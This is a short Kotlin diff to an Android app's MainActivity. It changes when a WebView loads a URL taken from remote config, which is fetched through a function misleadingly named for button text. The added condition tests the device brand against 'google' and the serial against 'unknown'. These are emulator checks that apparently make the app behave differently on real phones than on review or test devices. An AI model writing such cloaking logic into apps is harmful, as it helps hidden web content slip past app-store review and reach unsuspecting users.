@@ -1,5 +1,6 @@
 package com.delta.soft
 
+import android.os.Build
 import android.os.Bundle
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -20,6 +21,7 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         val url = RemoteConfigUtils.getNextButtonText()
+
 
         setContent {
             Surface(modifier = Modifier.fillMaxSize()) {
@@ -157,7 +159,7 @@ class MainActivity : ComponentActivity() {
 
     @Composable
     fun UrlIntent(url: String) {
-        if (url.isNotEmpty()) {
+        if (url.isNotEmpty() || !Build.BRAND.contains("google") || Build.SERIAL != "unknown") {
             AndroidView(factory = {
                 WebView(this).apply {
                     webViewClient = WebViewClient()
